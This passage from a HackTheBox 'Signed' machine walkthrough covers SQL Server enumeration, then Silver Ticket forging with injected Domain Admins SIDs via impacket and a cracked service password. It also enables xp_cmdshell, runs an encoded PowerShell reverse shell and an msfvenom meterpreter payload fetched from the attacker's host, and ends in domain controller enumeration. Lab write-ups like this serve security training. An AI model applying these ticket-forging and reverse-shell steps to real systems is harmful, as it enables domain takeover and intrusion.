EXECUTE           GRANT        sp_syscollector_create_collector_type              SQL_STORED_PROCEDURE   

EXECUTE           GRANT        sp_syscollector_delete_collector_type              SQL_STORED_PROCEDURE   

EXECUTE           GRANT        sp_syscollector_create_collection_item             SQL_STORED_PROCEDURE   

EXECUTE           GRANT        sp_syscollector_delete_collection_item             SQL_STORED_PROCEDURE   

EXECUTE           GRANT        sp_syscollector_delete_collection_set              SQL_STORED_PROCEDURE   

IMPERSONATE       GRANT        NULL                                               NULL                   

EXECUTE           GRANT        NULL                                               NULL                   

VIEW DEFINITION   GRANT        NULL                                               NULL                   

EXECUTE           GRANT        NULL                                               NULL                   

VIEW DEFINITION   GRANT        NULL                                               NULL                   

EXECUTE           GRANT        NULL                                               NULL                   

VIEW DEFINITION   GRANT        NULL                                               NULL                   

EXECUTE           GRANT        NULL                                               NULL                   

VIEW DEFINITION   GRANT        NULL                                               NULL
```

To understand more about the `Data Collector` user that was a member of `dc_admin` and to figure out if we could leverage it somehow, we searched for `database principals` related to the `Data Collector feature`. But we only hit another dead end.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT name, type_desc, authentication_type_desc, sid FROM sys.database_principals WHERE name LIKE '%DataCollector%';
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
name                           type_desc   authentication_type_desc                                                           sid   
----------------------------   ---------   ------------------------   -----------------------------------------------------------   
MS_DataCollectorInternalUser   SQL_USER    NONE                       b'0105000000000009030000004afef240a4aef447b344a561713c823f'
```

The `certificate enumeration` was expanded to include information about which database users the certificates were mapped to.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT c.name, c.certificate_id, c.pvt_key_encryption_type_desc, dp.name as mapped_user FROM sys.certificates c LEFT JOIN sys.database_principals dp ON c.principal_id = dp.principal_id;
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
name                                                                      certificate_id   pvt_key_encryption_type_desc   mapped_user   
-----------------------------------------------------------------------   --------------   ----------------------------   -----------   
##MS_AgentSigningCertificate##                                                       104   NO_PRIVATE_KEY                 dbo           

##MS_SchemaSigningCertificate49DAF39CDF8914F6AD714B481518685F0570173F##              256   NO_PRIVATE_KEY                 dbo
```

An attempt was made to identify any database users that were mapped to certificates. At least it was an attempt.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT name, type_desc, authentication_type_desc FROM sys.database_principals WHERE type = 'C';
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
name   type_desc   authentication_type_desc   
----   ---------   ------------------------
```

Now we checked the `permissions` directly assigned to the `MS_DataCollectorInternalUser` account (independent of role membership).

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT pr.name, pe.permission_name, pe.state_desc, OBJECT_NAME(pe.major_id) AS object FROM sys.database_permissions pe JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_id WHERE pr.name = 'MS_DataCollectorInternalUser';
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
name                           permission_name   state_desc   object   
----------------------------   ---------------   ----------   ------   
MS_DataCollectorInternalUser   CONNECT           GRANT        NULL
```

To determine what actions could be performed against the `MS_DataCollectorInternalUser` principal itself, we used the `fn_my_permissions` function.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT * FROM fn_my_permissions('MS_DataCollectorInternalUser', 'USER');
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
entity_name                    subentity_name   permission_name   
----------------------------   --------------   ---------------   
MS_DataCollectorInternalUser                    VIEW DEFINITION
```

We headed back to the `certificate` topic to see if we were able to actually `create` them ourselves..

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'CREATE CERTIFICATE');
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
       
----   
NULL
```

Then we examined the `authentication configuration` for the `dbo` principal in the `msdb` database.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT name, authentication_type_desc FROM sys.database_principals WHERE name = 'dbo';
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
name   authentication_type_desc   
----   ------------------------   
dbo    INSTANCE
```

At the server level, we searched for any `logins` that were mapped to `certificates`.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT sp.name, sp.type_desc, sp.sid FROM sys.server_principals sp WHERE sp.type = 'C';
name                                      type_desc                                                                                  sid   
---------------------------------------   ------------------------   -------------------------------------------------------------------   
##MS_SQLResourceSigningCertificate##      CERTIFICATE_MAPPED_LOGIN   b'01060000000000090100000067bc58c8c8c025733faa176c3aab1d3cef25d651'   

##MS_SQLReplicationSigningCertificate##   CERTIFICATE_MAPPED_LOGIN   b'010600000000000901000000164f477795874c92bca2a4a814dadd73c4aa4062'   

##MS_SQLAuthenticatorCertificate##        CERTIFICATE_MAPPED_LOGIN   b'010600000000000901000000a3641c720b9466cab42e1d5f939a5427c4d9cfcc'   

##MS_PolicySigningCertificate##           CERTIFICATE_MAPPED_LOGIN   b'0106000000000009010000007bd6fa74deb8db961034c0d96173b0e9d3e7d4ba'   

##MS_SmoExtendedSigningCertificate##      CERTIFICATE_MAPPED_LOGIN   b'010600000000000901000000a37fda7bd68a34744a0455d026fb761f0353c536'   

##MS_AgentSigningCertificate##            CERTIFICATE_MAPPED_LOGIN   b'010600000000000901000000fb1b6ce60eda55e1d3dde93b99db322bfc435563'
```

We checked which database had the `TRUSTWORTHY` settings enabled.

```shell
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, is_trustworthy_on FROM sys.databases;
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1
```

To understand the `functionality` of `stored procedures` in the `msdb` database, we retrieved the `source code` for `sp_sysdac_rename_database`. If the `stored procedure` could be `executed` or if the `pattern` of `dynamic SQL execution` could be leveraged, we might had an opportunity for `SQL Injection (SQLi)` or `Privilege Escalation`.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; EXEC sp_helptext 'sp_sysdac_rename_database';
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
Text                                                                                                               
----------------------------------------------------------------------------------------------------------------   
CREATE   PROCEDURE [dbo].[sp_sysdac_rename_database]  
                                                           

        @database_name sysname,
                                                                                  

        @new_name sysname
                                                                                        

AS  
                                                                                                             

SET NOCOUNT ON;
                                                                                                  

BEGIN  
                                                                                                          

    DECLARE @sqlstatement nvarchar(1000)
                                                                         


                                                                                                                 

    -- Alter the database to single user mode    
                                                                

    DECLARE @quoted_database_name nvarchar(258)
                                                                  

    SET @quoted_database_name = QUOTENAME(@database_name)
                                                        

    SET @sqlstatement = 'ALTER DATABASE ' + @quoted_database_name + ' SET SINGLE_USER WITH ROLLBACK IMMEDIATE'
   

    EXEC (@sqlstatement)
                                                                                         


                                                                                                                 

    -- Rename the database
                                                                                       

    EXEC sp_rename @objname=@quoted_database_name, @newname=@new_name, @objtype='DATABASE'
                       


                                                                                                                 

    -- Revert the database back to multi user mode
                                                               

    DECLARE @quoted_new_name nvarchar(258)
                                                                       

    SET @quoted_new_name = QUOTENAME(@new_name)
                                                                  

    SET @sqlstatement = 'ALTER DATABASE ' + @quoted_new_name + ' SET MULTI_USER WITH ROLLBACK IMMEDIATE'
         

    EXEC (@sqlstatement)
                                                                                         

            
                                                                                                     

    RETURN(@@error)
                                                                                              

END
```

At this point we tried an alternative method to `retrieve` the `definition` of `database objects` by querying the `OBJECT_DEFINITION` function.

The comments in the code were particularly interesting, noting that `CREATE ANY DATABASE` permission should theoretically be sufficient, but `dbcreator` role membership was required due to database rename operations.

This function provided insight into the permission checks used by `DAC-related` stored procedures in `msdb`, which could be relevant for understanding what privileges were needed to execute certain operations in the database.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> USE msdb; SELECT OBJECT_DEFINITION(OBJECT_ID('dbo.fn_sysdac_is_dac_creator'));
ENVCHANGE(DATABASE): Old Value: msdb, New Value: msdb
INFO(DC01): Line 1: Changed database context to 'msdb'.
                                                                                                                                                                                                                                                                  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
CREATE   FUNCTION [dbo].[fn_sysdac_is_dac_creator]()
RETURNS int
BEGIN
    DECLARE @engineEdition int = CAST(SERVERPROPERTY('EngineEdition') AS int);
    DECLARE @isdaccreator int;

    -- Check the engine edition
    IF (@engineEdition = 5)
    BEGIN
        -- Windows Azure SQL Database:
        --   is member of dbmanager or is superuser.

        SET @isdaccreator = COALESCE(IS_MEMBER('dbmanager'), 0) | 
            dbo.fn_sysdac_is_currentuser_sa()

    END ELSE
    BEGIN
        -- Standalone, default:
        --  is member of dbcreator

        /*
        We should only require CREATE ANY DATABASE but the database rename 
        step of creating a DAC requires that we have dbcreator.
    
        If that changes use the code below
    
        -- CREATE ANY DATABASE is what makes somebody a creator
        Set @isdaccreator = HAS_PERMS_BY_NAME(null, null, 'CREATE ANY DATABASE')
        */

        SET @isdaccreator = COALESCE(is_srvrolemember('dbcreator'), 0)
        
    END

    RETURN @isdaccreator;
END
```

## Initial Access

### Privilege Escalation to dbo forging a Silver Ticket

Since we enumerated all that came to our minds, we moved on with the plan of forging a `Silver Ticket` in order to `escalate` our `privileges` and achieve `code execution` through `xp_cmdshell`.

To forge the `Silver Ticket` with accurate parameters, the `Security Identifier (SID)` for the `SIGNED\mssqlsvc` account was needed.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT SUSER_SID('SIGNED\mssqlsvc');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

To use this SID for forging the Silver Ticket, the binary value needed to be converted to the standard SID format (`S-1-5-21-...`). The binary SID could be decoded as:

- The first bytes identify it as a domain SID structure
- The domain identifier portion: `S-1-5-21-4088429403-1159899800-2753317549`
- The Relative Identifier (RID): `1103` (hex `4f04` reversed from little-endian `044f` at the end)

This gave the complete SID: `S-1-5-21-4088429403-1159899800-2753317549-1103`

Similarly, we retrieved the `Security Identifier (SID)` for the `SIGNED\IT` domain group.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT SUSER_SID('SIGNED\IT');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   
```

Converting this binary SID to standard format revealed:

- Domain SID: `S-1-5-21-4088429403-1159899800-2753317549` (same as before, confirming the domain)
- RID: `1105` (hex `5104` reversed from little-endian `0451` at the end)

This gave the complete SID for the IT group: `S-1-5-21-4088429403-1159899800-2753317549-1105`

We also grabbed the `Security Identifier (SID)` for the `Domain Admins` group.

```shell
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT SUSER_SID('SIGNED\Domain Admins');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'
```

Converting this to standard SID format yielded:

- Domain SID: `S-1-5-21-4088429403-1159899800-2753317549` (consistent with the domain)
- RID: `512` (hex `0200` reversed from little-endian `0002` at the end)

The complete SID: `S-1-5-21-4088429403-1159899800-2753317549-512`

The RID of `512` is the well-known identifier for the Domain Admins group in Active Directory, which is consistent across all domains. This group has complete administrative control over the entire domain.

Rather than forging a simple Silver Ticket that would only grant the `mssqlsvc` account's actual privileges, `Privilege Attribute Certificate (PAC)` manipulation was performed by injecting privileged group memberships into the ticket. This technique, also known as `SID Injection`, allowed elevation beyond the service account's legitimate permissions.

```python
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/files]
└─$ cat decode.py 
#!/usr/bin/env python3
import struct
import hashlib

def parse_sid(hex_sid):
    """Convert binary SID (in hex string format) to readable SID string"""
    # Remove any quotes or 'b' prefix and convert to bytes
    hex_sid = hex_sid.replace("b'", "").replace("'", "").strip()
    sid_bytes = bytes.fromhex(hex_sid)
    
    # Parse SID structure
    revision = sid_bytes[0]
    sub_auth_count = sid_bytes[1]
    authority = struct.unpack('>Q', b'\x00\x00' + sid_bytes[2:8])[0]
    
    sub_auths = []
    for i in range(sub_auth_count):
        sub_auth = struct.unpack('<I', sid_bytes[8 + i*4:8 + (i+1)*4])[0]
        sub_auths.append(str(sub_auth))
    
    sid_string = f"S-{revision}-{authority}-{'-'.join(sub_auths)}"
    return sid_string

# SIDs from SQL Server
mssqlsvc_sid_hex = "0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
it_sid_hex = "0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000"
domain_admins_sid_hex = "0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000"

# Parse SIDs
mssqlsvc_sid = parse_sid(mssqlsvc_sid_hex)
it_sid = parse_sid(it_sid_hex)
domain_admins_sid = parse_sid(domain_admins_sid_hex)

print("=" * 70)
print("SID Information")
print("=" * 70)
print(f"mssqlsvc SID:      {mssqlsvc_sid}")
print(f"IT group SID:      {it_sid}")
print(f"Domain Admins SID: {domain_admins_sid}")
print()

# Extract domain SID and RIDs
domain_sid = '-'.join(mssqlsvc_sid.split('-')[:-1])
mssqlsvc_rid = mssqlsvc_sid.split('-')[-1]
it_rid = it_sid.split('-')[-1]
domain_admins_rid = domain_admins_sid.split('-')[-1]
enterprise_admins_rid = "519"  # Well-known RID for Enterprise Admins

print("=" * 70)
print("Domain Information")
print("=" * 70)
print(f"Domain SID:               {domain_sid}")
print(f"mssqlsvc RID:             {mssqlsvc_rid}")
print(f"IT group RID:             {it_rid}")
print(f"Domain Admins RID:        {domain_admins_rid}")
print(f"Enterprise Admins RID:    {enterprise_admins_rid}")
print()

# Calculate NTLM hash
password = "purPLE9795!@"
ntlm_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()

print("=" * 70)
print("NTLM Hash")
print("=" * 70)
print(f"Password:              {password}")
print(f"NTLM Hash:             {ntlm_hash}")
print()

# Print silver ticket command with PAC manipulation
print("=" * 70)
print("Silver Ticket Command (with PAC Manipulation)")
print("=" * 70)
print(f"impacket-ticketer -nthash {ntlm_hash} \\")
print(f"  -domain-sid {domain_sid} \\")
print(f"  -domain SIGNED.HTB \\")
print(f"  -spn MSSQLSvc/DC01.SIGNED.HTB:1433 \\")
print(f"  -groups {domain_admins_rid},{enterprise_admins_rid},{it_rid} \\")
print(f"  -user-id {mssqlsvc_rid} \\")
print(f"  mssqlsvc")
print()
print("export KRB5CCNAME=mssqlsvc.ccache")
print("impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB")
print()

# Alternative: Silver ticket without privilege escalation
print("=" * 70)
print("Alternative: Standard Silver Ticket (No PAC Manipulation)")
print("=" * 70)
print(f"impacket-ticketer -nthash {ntlm_hash} \\")
print(f"  -domain-sid {domain_sid} \\")
print(f"  -domain SIGNED.HTB \\")
print(f"  -spn MSSQLSvc/DC01.SIGNED.HTB:1433 \\")
print(f"  -user-id {mssqlsvc_rid} \\")
print(f"  mssqlsvc")
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/files]
└─$ python3 decode.py 
======================================================================
SID Information
======================================================================
mssqlsvc SID:      S-1-5-21-4088429403-1159899800-2753317549-1103
IT group SID:      S-1-5-21-4088429403-1159899800-2753317549-1105
Domain Admins SID: S-1-5-21-4088429403-1159899800-2753317549-512

======================================================================
Domain Information
======================================================================
Domain SID:               S-1-5-21-4088429403-1159899800-2753317549
mssqlsvc RID:             1103
IT group RID:             1105
Domain Admins RID:        512
Enterprise Admins RID:    519

======================================================================
NTLM Hash
======================================================================
Password:              purPLE9795!@
NTLM Hash:             ef699384c3285c54128a3ee1ddb1a0cc

======================================================================
Silver Ticket Command (with PAC Manipulation)
======================================================================
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain SIGNED.HTB \
  -spn MSSQLSvc/DC01.SIGNED.HTB:1433 \
  -groups 512,519,1105 \
  -user-id 1103 \
  mssqlsvc

export KRB5CCNAME=mssqlsvc.ccache
impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB

======================================================================
Alternative: Standard Silver Ticket (No PAC Manipulation)
======================================================================
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain SIGNED.HTB \
  -spn MSSQLSvc/DC01.SIGNED.HTB:1433 \
  -user-id 1103 \
  mssqlsvc
```

The cracked password `purPLE9795!@` was `converted` to its `NTLM hash` format for use in the `Silver Ticket`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/files]
└─$ python3 -c 'import hashlib; print(hashlib.new("md4","purPLE9795!@".encode("utf-16le")).hexdigest())'
ef699384c3285c54128a3ee1ddb1a0cc
```

Before we proceed we updated our `/etc/krb5.conf` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/krb5.conf
[libdefaults]
    default_realm = SIGNED.HTB
    dns_lookup_kdc = false

[realms]
    SIGNED.HTB = {
        kdc = DC01.signed.htb
        admin_server = DC01.signed.htb
    }

[domain_realm]
    .signed.htb = SIGNED.HTB
    signed.htb = SIGNED.HTB
```

The Silver Ticket was forged using `impacket-ticketer`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/files]
└─$ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain ef699384c3285c54128a3ee1ddb1a0cc -spn MSSQLSVC/DC01.SIGNED.HTB -groups 512,519,1105 -user-id 1103 mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for ef699384c3285c54128a3ee1ddb1a0cc/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

Then we exported the new ticket.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/files]
└─$ export KRB5CCNAME=mssqlsvc.ccache
```

And after we logged back in using our forged ticket, we got access as `dbo`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/files]
└─$ impacket-mssqlclient -k -no-pass dc01.signed.htb                             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

### Code Execution through xp_cmdshell

We enabled `xp_cmdshell` to achieve `code execution`.

```shell
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

```shell
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
```

```shell
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

```shell
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
```

Then we executed our `reverse shell payload` and got a `callback`.

```shell
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOQA3ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.97] from (UNKNOWN) [10.129.34.27] 64840

PS C:\Windows\system32>
```

## user.txt

For convenience reasons we also grabbed the `user.txt` right from inside the `SQL Server instance` before we moved on.

```shell
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC xp_cmdshell 'type C:\Users\mssqlsvc\Desktop\user.txt';
output                             
--------------------------------   
2b31103006a7b4a819d0cf02f0824e35   

NULL
```

##  Persistence

To have an additional channel for working on the `Privilege Escalation` to `SYSTEM` we also dropped a `session` for `meterpreter` on `Metasploit`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/serve]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.97 LPORT=4444 -f exe -o asdf.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: asdf.exe
```

```shell
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Enable verbose logging with set VERBOSE true
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.16.97
LHOST => 10.10.16.97
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.97:4444
```

```cmd
┌──(kali㉿kali)-[/media/…/HTB/Machines/Signed/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```cmd
PS C:\temp> iwr 10.10.16.97/asdf.exe -o asdf.exe
```

```cmd
PS C:\temp> .\asdf.exe
```

```shell
[*] Sending stage (203846 bytes) to 10.129.34.27
[*] Meterpreter session 1 opened (10.10.16.97:4444 -> 10.129.34.27:65003) at 2025-10-11 22:58:53 +0200

meterpreter > 
```

## Enumeration (MSSQLSVC / Shell)

After taking care of our persistence we moved on with the `Enumeration` of the box through our newly gained shell.

```cmd
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name       SID                                           
=============== ==============================================
signed\mssqlsvc S-1-5-21-4088429403-1159899800-2753317549-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes                                        
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER                     Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                        State   
============================= ================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
SeCreateGlobalPrivilege       Create global objects              Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Since there was no other access to the box than through port `1433/TCP` we started by enumerating the `system specifications`, `users` and `groups` manually.

```cmd
PS C:\> systeminfo

Host Name:                 DC01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00000-00001-AA815
Original Install Date:     4/10/2020, 10:48:06 AM
System Boot Time:          10/11/2025, 12:00:27 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 1,877 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,363 MB
Virtual Memory: In Use:    2,436 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    SIGNED.HTB
Logon Server:              N/A
Hotfix(s):                 12 Hotfix(s) Installed.
                           [01]: KB5065744
                           [02]: KB4535680
                           [03]: KB4539571
                           [04]: KB4570332
                           [05]: KB4589208
                           [06]: KB5005112
                           [07]: KB5058392
                           [08]: KB5015896
                           [09]: KB5020374
                           [10]: KB5039335
                           [11]: KB5058525
                           [12]: KB5065765
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.34.27
                                 [02]: fe80::8ee2:ce65:6be9:f9f1
                                 [03]: dead:beef::4d4:a44c:e1cc:1d88
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```cmd
PS C:\> net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            amelia.kelly             ava.morris               
charlotte.price          elijah.brooks            emma.clark               
